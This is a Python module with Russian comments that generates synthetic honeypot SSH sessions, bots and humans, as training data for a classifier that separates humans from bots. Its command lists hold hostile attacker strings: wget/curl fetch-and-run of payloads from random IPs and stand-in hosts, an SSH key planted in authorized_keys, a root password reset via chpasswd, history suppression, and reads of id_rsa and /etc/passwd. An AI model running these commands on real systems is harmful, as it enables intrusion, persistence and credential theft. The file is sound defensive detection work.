"""Симулятор сессий honeypot: боты и люди → события в формате таблицы бэкенда.

Зачем: в публичных логах Cowrie людей практически нет (см. EVALUATION.md, раздел is_human), поэтому
«человеческие» сессии для обучения приходится генерировать. Ботов генерируем тоже, но главный источник ботов —
реальные сессии; синтетические боты нужны для трудных случаев, которых в реальности мало (бот с «человеческим»
случайным темпом).

ВАЖНО (эпистемика): модель, обученная на симуляции, выучивает НАШИ ПРЕДСТАВЛЕНИЯ о людях. Проверить её на людях
можно только на реальных записях людей — например, когда команда сама поиграет в атакующего на своём honeypot.

Формат каждого события — как в таблице бэкенда:
    {"id", "timestamp", "attacker_ip", "event_type", "session_id", "payload": {...}}
"""
from __future__ import annotations

import hashlib
import math
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone

# ───────────────────────── словари ─────────────────────────
_USERS = ["root", "admin", "ubuntu", "user", "test", "pi", "oracle", "postgres", "git", "support", "guest", "ftpuser"]
_PASSWORDS = ["123456", "admin", "root", "password", "12345", "1234", "123", "toor", "qwerty", "1qaz2wsx", "admin123",
              "P@ssw0rd", "raspberry", "ubuntu", "default", "letmein", "000000", "111111", "changeme", "abc123"]
_HOST_DIRS = ["/var/www", "/var/www/html", "/home", "/opt", "/srv", "/etc", "/var/log", "/root", "/tmp", "/var/backups"]
_FILES = ["config.php", "wp-config.php", ".env", "settings.py", "database.yml", "backup.sql", "notes.txt", "id_rsa",
          "credentials.json", "docker-compose.yml", ".bash_history", "app.conf"]
_SUBDIRS = ["app", "site", "backup", "data", "projects", "old", "dev", "admin", "uploads", "scripts"]


def _ip(rng: random.Random) -> str:
    return f"{rng.randint(1, 223)}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"


def _url(rng: random.Random) -> str:
    host = _ip(rng) if rng.random() < 0.7 else rng.choice(["cdn-update.net", "files.x0x.ru", "pastebin.example", "dl.mirror.io"])
    name = rng.choice(["x.sh", "bins.sh", "a", "kinsing", "xmrig", "lin.sh", "update", "sshd", "b", "t.sh", "x86", "mips"])
    return f"http://{host}/{name}"


# ───────────────────────── каркас сессии ─────────────────────────
@dataclass
class _Sess:
    rng: random.Random
    t: datetime
    ip: str
    sid: str
    events: list = field(default_factory=list)

    def wait(self, sec: float) -> None:
        self.t += timedelta(seconds=max(0.0, sec))

    def _emit(self, etype: str, payload: dict) -> None:
        self.events.append({"id": len(self.events) + 1, "timestamp": self.t.isoformat().replace("+00:00", "Z"),
                            "attacker_ip": self.ip, "event_type": etype, "session_id": self.sid, "payload": payload})

    def login(self, user: str, pwd: str, ok: bool) -> None:
        self._emit("ssh_login_attempt", {"username": user, "password": pwd, "success": ok})

    def cmd(self, c: str) -> None:
        self._emit("command_executed", {"command": c})

    def download(self, url: str) -> None:
        self._emit("malware_download", {"url": url, "file_hash": hashlib.sha256(url.encode()).hexdigest()})


def _new(rng: random.Random, t0: datetime) -> _Sess:
    return _Sess(rng, t0 + timedelta(seconds=rng.uniform(0, 86400 * 30)), _ip(rng), f"sim{rng.getrandbits(48):012x}")


def _lognorm(rng: random.Random, median: float, sigma: float) -> float:
    return median * math.exp(rng.gauss(0, sigma))


# ───────────────────────── БОТЫ ─────────────────────────
# Сценарии типовых семейств (по мотивам реальных логов, но собраны заново, а не скопированы).
def _bot_scripts(rng: random.Random) -> list[list[str]]:
    u = _url(rng)
    f = u.rsplit("/", 1)[-1]
    rnd = "".join(rng.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(rng.randint(4, 8)))
    return [
        ["enable", "system", "shell", "sh", "cat /proc/mounts; /bin/busybox " + rnd.upper(),
         "cd /tmp; wget " + u + "; chmod 777 " + f + "; ./" + f + " ssh", "/bin/busybox " + rnd.upper()],
        ["uname -a", "nproc", "cat /proc/cpuinfo | grep name | head -n 1", "free -m", "ls -lh $(which ls)", "crontab -l",
         "w", "uname -m", "lscpu | grep Model", "df -h | head -n 2"],
        ["cd ~; chattr -ia .ssh; lockr -ia .ssh", "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3Nza"
         + rnd + "== mdrfckr\" >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
         "cat /proc/cpuinfo | grep name | wc -l", "echo \"root:" + rnd + "\"|chpasswd|bash", "uname -a", "top"],
        ["echo 1 && cat /bin/echo", "uname -s -v -n -r -m", "cat /etc/os-release", "ps | grep '[Mm]iner'",
         "ps -ef | grep '[Mm]iner'"],
        ["cd /tmp || cd /var/run || cd /mnt || cd /root || cd /", "wget " + u, "curl -O " + u, "chmod +x " + f,
         "./" + f, "rm -rf " + f],
        ["sh", "linuxshell", "/bin/busybox", "cd /proc && cat self/cmdline", "shell"],
        ["export HISTFILE=/dev/null", "uname -a", "id", "cat /etc/issue", "nvidia-smi --list-gpus", "lspci | grep VGA"],
        ["echo -e '\\x6F\\x6B'", "cat /proc/self/exe > .s; chmod 777 .s", ">.x && cd .", "dd bs=52 count=1 if=.s",
         "/bin/busybox wget; /bin/busybox tftp", "/bin/busybox " + rnd.upper()],
        ["cat /etc/*release* | grep 'centos:7'", "file /sbin/init", "uname -a"],
        ["/ip cloud print", "ifconfig", "cat /proc/cpuinfo", "ps | grep '[Mm]iner'", "echo Hi | cat -n"],
    ]


def bot_session(rng: random.Random, t0: datetime, style: str | None = None) -> list[dict]:
    """Стили темпа: instant (всё сразу), paced (ждёт ответа, почти равные паузы), timeout (плюс ожидания по таймауту),
    jitter (трудный случай: случайный «человеческий» темп при скриптовом содержимом), brute (только подбор паролей)."""
    s = _new(rng, t0)
    style = style or rng.choices(["instant", "paced", "timeout", "jitter", "brute"], [30, 25, 10, 15, 20])[0]
    step = rng.uniform(0.4, 3.0)
    jit = rng.uniform(0.02, 0.25)

    def gap() -> float:
        if style == "instant":
            return rng.uniform(0.0, 0.25)
        if style in ("paced", "timeout"):
            g = step * (1 + rng.gauss(0, jit))
            if style == "timeout" and rng.random() < 0.15:
                g += rng.choice([5, 10, 15, 30, 60])
            return g
        return _lognorm(rng, rng.uniform(1.0, 5.0), rng.uniform(0.4, 1.0))  # jitter/mimic: имитирует человека

    # подбор пароля
    n_login = rng.randint(3, 60) if style == "brute" else rng.choices([1, 2, 3, 5], [70, 15, 10, 5])[0]
    for i in range(n_login):
        ok = (i == n_login - 1) and (style != "brute" or rng.random() < 0.3)
        s.login(rng.choice(_USERS), rng.choice(_PASSWORDS), ok)
        s.wait(gap() if style != "brute" else rng.uniform(0.05, 3.0) if rng.random() < 0.5 else step)
    if style == "brute":
        return s.events
    script = list(rng.choice(_bot_scripts(rng)))
    if style == "mimic":
        # трудный случай-противник: бот специально «ходит по папкам» и делает человеческие паузы
        script = ["ls", "cd /var/www", "ls -la", "cd ..", "pwd"] + script
    if rng.random() < 0.3 and style != "mimic":  # некоторые семейства шлют всё одной строкой
        script = ["; ".join(script)]
    for c in script:
        s.cmd(c)
        if "wget " in c and rng.random() < 0.5:
            s.download(_url(rng))
        s.wait(gap())
    return s.events


# ───────────────────────── ЛЮДИ ─────────────────────────
_TYPO_FIXED = {"ls -la": ["ls-la", "sl -la", "ls -al", "ks -la"], "cd ..": ["cd..", "cd .."], "clear": ["clera", "cler"],
               "ifconfig": ["ifconfgi", "ifocnfig"], "whoami": ["whoamni", "woami"], "cat": ["cta", "car"],
               "sudo -l": ["suod -l", "sudo -L"], "ps aux": ["ps aus", "sp aux"], "history": ["histroy", "hisotry"],
               "netstat -tulpn": ["netstat -tulnp", "netsta -tulpn"], "uname -a": ["unmae -a", "uname -A"]}


def _typo(rng: random.Random, c: str) -> str:
    for good, bad in _TYPO_FIXED.items():
        if c.startswith(good):
            return rng.choice(bad) + c[len(good):]
    if len(c) < 3:
        return c + c[-1]
    i = rng.randrange(0, min(len(c) - 1, 6))
    op = rng.random()
    if op < 0.4:   # перестановка соседних букв
        return c[:i] + c[i + 1] + c[i] + c[i + 2:]
    if op < 0.7:   # пропуск буквы
        return c[:i] + c[i + 1:]
    return c[:i] + c[i] + c[i:]  # двойное нажатие


@dataclass
class _Persona:
    think: float      # медиана «подумать», с
    think_sigma: float
    cps: float        # скорость набора, символов/с
    p_typo: float
    p_paste: float    # вероятность, что команда вставлена из буфера (нет времени набора)
    goal: str         # explore | loot | implant | admin


def _persona(rng: random.Random, shifted: bool = False) -> _Persona:
    """shifted=True — сдвинутые распределения для проверки обобщения (быстрые, аккуратные, «опытные» люди)."""
    if shifted:
        return _Persona(think=rng.uniform(0.8, 2.5), think_sigma=rng.uniform(0.4, 0.8), cps=rng.uniform(6, 11),
                        p_typo=rng.uniform(0.0, 0.05), p_paste=rng.uniform(0.2, 0.6),
                        goal=rng.choice(["explore", "loot", "implant", "admin"]))
    return _Persona(think=rng.uniform(1.5, 7.0), think_sigma=rng.uniform(0.5, 1.1), cps=rng.uniform(2.5, 7.0),
                    p_typo=rng.uniform(0.02, 0.15), p_paste=rng.uniform(0.0, 0.3),
                    goal=rng.choice(["explore", "explore", "loot", "implant", "admin"]))


def _human_plan(rng: random.Random, goal: str) -> list[str]:
    d = rng.choice(_HOST_DIRS)
    sub = rng.choice(_SUBDIRS)
    f = rng.choice(_FILES)
    plan = [rng.choice(["whoami", "id", "pwd", "w", "hostname"]), rng.choice(["ls", "ls -la", "ls -lah"])]
    if rng.random() < 0.5:
        plan.append(rng.choice(["uname -a", "cat /etc/os-release", "uptime"]))
    plan += [f"cd {d}", rng.choice(["ls", "ls -la"]), f"cd {sub}", "ls", f"cat {f}"]
    if rng.random() < 0.4:
        plan += ["cd ..", rng.choice(["ls", "ls -la"])]
    if goal in ("loot", "explore"):
        plan += rng.sample(["cat /etc/passwd", "cat ~/.bash_history", "find / -name '*.sql' 2>/dev/null",
                            "grep -ri password . 2>/dev/null", "ls -la ~/.ssh", "cat ~/.ssh/id_rsa", "env",
                            f"tail -n 50 /var/log/{rng.choice(['auth.log', 'syslog', 'nginx/access.log'])}",
                            "mysql -u root -p", "ps aux", "netstat -tulpn", "df -h"], k=rng.randint(2, 6))
    if goal == "implant":
        u = _url(rng)
        fn = u.rsplit("/", 1)[-1]
        plan += ["which wget curl python3", "cd /tmp", f"wget {u}", "ls -la", f"chmod +x {fn}", f"./{fn}",
                 rng.choice(["ps aux | grep " + fn, "crontab -e", "nano /etc/crontab"])]
    if goal == "admin":
        plan += rng.sample(["sudo -l", "sudo su", "top", "free -m", "systemctl status nginx", "docker ps",
                            "man ls", "ls --help", "vi /etc/hosts", "less /var/log/syslog"], k=rng.randint(2, 5))
    if rng.random() < 0.5:
        plan.append(rng.choice(["history", "clear", "help"]))
    if rng.random() < 0.6:
        plan.append("exit")
    return plan


_MINIMAL_RECON = ["uname -a", "nproc", "cat /proc/cpuinfo", "free -m", "id", "w", "cat /etc/os-release", "df -h", "lscpu",
                  "ps aux", "crontab -l", "nvidia-smi", "ifconfig", "cat /etc/passwd", "history", "uptime", "ip a"]


def human_session(rng: random.Random, t0: datetime, shifted: bool = False, paste_block: bool | None = None,
                  minimal: bool = False) -> list[dict]:
    """Человек: время = подумать (логнормальное) + набрать (пропорционально длине) + прочитать вывод.
    Опечатки → обычно повтор исправленной команды. paste_block — человек вставляет готовый кусок скрипта
    (трудный случай: внутри куска паузы как у бота)."""
    s = _new(rng, t0)
    p = _persona(rng, shifted)
    # вход: иногда ошибается в пароле
    user = rng.choice(["root", "admin", "ubuntu", "user"])
    pwd = rng.choice(_PASSWORDS)
    for _ in range(rng.choices([0, 1, 2], [70, 22, 8])[0]):
        s.login(user, _typo(rng, pwd), False)
        s.wait(_lognorm(rng, 4.0, 0.5) + len(pwd) / p.cps)
    s.login(user, pwd, True)
    s.wait(_lognorm(rng, p.think * 1.3, p.think_sigma))

    if minimal:
        # «трудный» человек: без навигации по папкам, короткий набор разведки как у бота (+ иногда установка)
        plan = rng.sample(_MINIMAL_RECON, k=rng.randint(3, 7))
        if rng.random() < 0.5:
            u = _url(rng)
            plan += [f"cd /tmp; wget {u}", f"chmod +x {u.rsplit('/', 1)[-1]}", f"./{u.rsplit('/', 1)[-1]}"]
    else:
        plan = _human_plan(rng, p.goal)
    if paste_block if paste_block is not None else rng.random() < 0.15:
        block = rng.choice(_bot_scripts(rng))[: rng.randint(3, 6)]
        at = rng.randint(1, len(plan))
        plan[at:at] = [("__PASTE__", c) for c in block]

    for item in plan:
        if isinstance(item, tuple):          # вставленный блок: как у бота
            s.cmd(item[1])
            s.wait(rng.uniform(0.0, 0.15))
            continue
        c = item
        pasted = rng.random() < p.p_paste
        typing = 0.05 if pasted else len(c) / p.cps * rng.uniform(0.8, 1.3)
        if not pasted and rng.random() < p.p_typo:
            s.wait(typing)
            s.cmd(_typo(rng, c))
            s.wait(rng.uniform(0.8, 3.0))  # прочитать «command not found»
            if rng.random() < 0.85:
                s.wait(len(c) / p.cps)
                s.cmd(c)
        else:
            s.wait(typing)
            s.cmd(c)
        reading = rng.uniform(0.5, 4.0) if c.split()[0] in ("cat", "ls", "ps", "find", "grep", "tail", "less", "history") else 0
        s.wait(_lognorm(rng, p.think, p.think_sigma) + reading)
        if c.startswith("wget") and rng.random() < 0.6:
            s.download(c.split()[-1])
        if rng.random() < 0.05:  # отошёл / гуглит
            s.wait(rng.uniform(20, 180))
    return s.events


# ───────────────────────── набор данных ─────────────────────────
T0 = datetime(2026, 9, 1, tzinfo=timezone.utc)


def build(n_human: int = 1500, n_bot: int = 1500, seed: int = 7, shifted_humans: float = 0.0,
          n_hard: int = 0, minimal_humans: float = 0.0) -> list[tuple[list[dict], int, str]]:
    """-> [(события, метка 1=человек/0=бот, подтип)]
    n_hard — сколько добавить «трудных» случаев КАЖДОГО вида, которых нет в обучении: человек без навигации
    (human_minimal) и бот, подражающий человеку (bot_mimic). Нужны только для проверки.
    minimal_humans — доля «минималистов» среди обычных людей (для обучения финальной модели)."""
    rng = random.Random(seed)
    out = []
    for _ in range(n_hard):
        out.append((human_session(rng, T0, minimal=True), 1, "human_minimal"))
        out.append((bot_session(rng, T0, "mimic"), 0, "bot_mimic"))
    for _ in range(n_human):
        if rng.random() < minimal_humans:
            out.append((human_session(rng, T0, minimal=True), 1, "human_minimal_train"))
            continue
        shifted = rng.random() < shifted_humans
        paste = rng.random() < 0.15
        out.append((human_session(rng, T0, shifted=shifted, paste_block=paste), 1,
                    "human_shifted" if shifted else "human_paste" if paste else "human"))
    for _ in range(n_bot):
        style = rng.choices(["instant", "paced", "timeout", "jitter", "brute"], [30, 25, 10, 15, 20])[0]
        out.append((bot_session(rng, T0, style), 0, f"bot_{style}"))
    rng.shuffle(out)
    return out
